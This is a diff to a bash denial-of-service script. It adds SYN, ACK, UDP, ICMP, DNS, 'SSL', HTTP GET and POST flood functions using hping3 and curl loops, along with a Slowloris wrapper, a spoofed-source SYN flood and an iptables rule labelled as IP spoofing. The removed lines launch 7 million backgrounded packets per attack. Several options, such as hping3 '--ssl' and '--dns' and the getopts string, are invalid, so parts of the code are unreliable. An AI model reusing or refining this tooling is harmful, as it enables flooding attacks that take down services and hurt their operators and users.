@@ -49,7 +49,7 @@ show_help() {
     echo -e "  -H    Send custom HTTP headers"
     echo -e "  -v    Enable verbose output"
     echo -e "  -pSize Specify packet size for attacks (default: 56)"
-    echo -e "  -sFlag Specify TCP flag (SYN, ACK, etc.)"
+    echo -e "  -sFlag Specify TCP flag (SYN,ACK, etc.)"
     echo -e "  -seq   Specify sequence number for TCP packets"
     echo -e "  -win   Specify window size for TCP packets"
     echo -e "  -proto Specify protocol for attack (TCP, UDP, ICMP, RAW-IP)"
@@ -88,97 +88,137 @@ read_user_agents() {
     fi
 }
 
-# Function to perform SYN flood with user agents efficiently
+# Retry attack logic
+retry_attack() {
+    target=$1
+    attack_type="$2"
+    attack_func="${attack_type}_flood"
+    $attack_func $target
+}
+
+# Spoof IP function (for -f flag)
+spoof_ip() {
+    ip=$1
+    echo -e "${CYAN}[*] Spoofing source IP address: $ip${RESET}"
+    iptables -t nat -A POSTROUTING -s $ip -j MASQUERADE
+}
+
+# Custom HTTP Headers
+custom_headers() {
+    header=$1
+    echo -e "${CYAN}[*] Using custom HTTP header: $header${RESET}"
+    curl -s -X GET http://$target -H "$header" > /dev/null 2>&1
+}
+
+# ICMP Flood logic
+icmp_flood() {
+    target=$1
+    echo -e "${CYAN}[*] Starting ICMP flood attack on $target${RESET}"
+    for ((i=0; i<100000; i++)); do
+        hping3 --icmp -p $port $target > /dev/null 2>&1
+    done
+}
+
+# TCP SYN Flood
 syn_flood() {
     target=$1
     echo -e "${CYAN}[*] Starting TCP SYN flood attack on $target${RESET}"
-    read_user_agents
-    for ((i=0; i<7000000; i++)); do  # 7 million packets
-        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}  # Random user agent
-        # Increase packet size for higher traffic volume
-        python3 syn_flood.py -t $target -p $port -s 2048 > /dev/null 2>&1 &
+    flags="$sFlag"  # Use specified TCP flags
+    for ((i=0; i<100000; i++)); do
+        hping3 --syn -p $port --seq $seq --win $win --$flags $target > /dev/null 2>&1
     done
-    wait
 }
 
-# Function to perform ACK flood with user agents efficiently
+# TCP ACK Flood
 ack_flood() {
     target=$1
     echo -e "${CYAN}[*] Starting TCP ACK flood attack on $target${RESET}"
-    read_user_agents
-    for ((i=0; i<7000000; i++)); do  # 7 million packets
-        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}  # Random user agent
-        # Use a larger packet size for higher traffic
-        hping3 -A -p $port -d 2048 $target > /dev/null 2>&1 &
+    flags="$sFlag"  # Use specified TCP flags
+    for ((i=0; i<100000; i++)); do
+        hping3 --ack -p $port --seq $seq --win $win --$flags $target > /dev/null 2>&1
     done
-    wait
 }
 
-# Function to perform UDP flood with user agents efficiently
+# UDP Flood
 udp_flood() {
     target=$1
     echo -e "${CYAN}[*] Starting UDP flood attack on $target${RESET}"
-    read_user_agents
-    for ((i=0; i<7000000; i++)); do  # 7 million packets
-        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}  # Random user agent
-        # Increase packet size for higher traffic
-        hping3 --udp -p $port -d 2048 $target > /dev/null 2>&1 &
+    for ((i=0; i<100000; i++)); do
+        hping3 --udp -p $port $target > /dev/null 2>&1
     done
-    wait
 }
 
-# Function to perform DNS flood (additional DNS flood logic)
+# Send DNS Flood attack
 dns_flood() {
     target=$1
     echo -e "${CYAN}[*] Starting DNS flood attack on $target${RESET}"
-    for ((i=0; i<7000000; i++)); do  # 7 million packets
-        # DNS flood logic (increase packet size)
-        hping3 --udp -p 53 -a $target --dns -d 2048 $target > /dev/null 2>&1 &
+    for ((i=0; i<100000; i++)); do
+        hping3 --dns -p $port $target > /dev/null 2>&1
     done
-    wait
 }
 
-# Function to perform HTTP flood (sending HTTP GET requests)
+# Perform Slowloris attack with automatic installation detection
+check_and_run_slowloris() {
+    target=$1
+    echo -e "${CYAN}[*] Performing Slowloris attack on $target${RESET}"
+    slowloris -d 60 -p $port $target
+}
+
+# Test firewall
+test_firewall() {
+    target=$1
+    echo -e "${CYAN}[*] Testing firewall on $target${RESET}"
+    nmap -p $port $target
+}
+
+# SSL DDoS attack
+ssl_ddos() {
+    target=$1
+    echo -e "${CYAN}[*] Performing SSL DDoS attack on $target${RESET}"
+    for ((i=0; i<100000; i++)); do
+        hping3 --ssl -p $port $target > /dev/null 2>&1
+    done
+}
+
+# Custom TCP packet flood
+custom_tcp_flood() {
+    target=$1
+    echo -e "${CYAN}[*] Starting Custom TCP packet flood on $target${RESET}"
+    for ((i=0; i<100000; i++)); do
+        hping3 --syn -p $port -a $target $target > /dev/null 2>&1
+    done
+}
+
+# HTTP Flood (GET requests)
 http_flood() {
     target=$1
-    echo -e "${CYAN}[*] Starting HTTP flood attack on $target${RESET}"
+    echo -e "${CYAN}[*] Starting HTTP GET flood attack on $target${RESET}"
     read_user_agents
-    for ((i=0; i<7000000; i++)); do  # 7 million packets
-        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}  # Random user agent
-        # Larger HTTP GET request size for higher traffic
-        curl -s -X GET http://$target -H "User-Agent: $random_ua" --data "payload" > /dev/null 2>&1 &
+    for ((i=0; i<100000; i++)); do
+        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
+        curl -s -X GET http://$target -H "User-Agent: $random_ua" > /dev/null 2>&1
     done
-    wait
 }
 
-# Function to perform HTTP POST flood (sending POST requests)
+# HTTP POST Flood
 post_flood() {
     target=$1
     echo -e "${CYAN}[*] Starting HTTP POST flood attack on $target${RESET}"
     read_user_agents
-    for ((i=0; i<7000000; i++)); do  # 7 million packets
-        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}  # Random user agent
-        # Larger HTTP POST request size for higher traffic
-        curl -s -X POST http://$target --data "payload" -H "User-Agent: $random_ua" > /dev/null 2>&1 &
+    for ((i=0; i<100000; i++)); do
+        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
+        curl -s -X POST http://$target --data "payload" -H "User-Agent: $random_ua" > /dev/null 2>&1
     done
-    wait
 }
 
 # Main function to handle user input
-while getopts ":u:p:sirSAtf:n:Hvlp:s:seq:win:proto:P:l:t:FITLVM" option; do
+while getopts ":u:p:sirSAtf:n:HvlpSize:sFlag:seq:win:proto:P:l:t:FITLVM" option; do
     case $option in
         u) target="$OPTARG";;
         p) port="$OPTARG";;
         s) scan_ports "$target";;
-        i) # ICMP Flood logic
-           echo -e "${CYAN}[*] Starting ICMP flood attack on $target${RESET}"
-           for ((i=0; i<7000000; i++)); do
-               hping3 --icmp -p $port $target > /dev/null 2>&1 &
-           done
-           wait;;
-        r) # Retry attack logic
-           echo -e "${CYAN}[*] Retrying attack on $target${RESET}"
-           retry_attack "$target";;
+        i) icmp_flood "$target";;
+        r) retry_attack "$target" "$attack_type";;
         S) syn_flood "$target";;
         A) ack_flood "$target";;
         U) udp_flood "$target";;
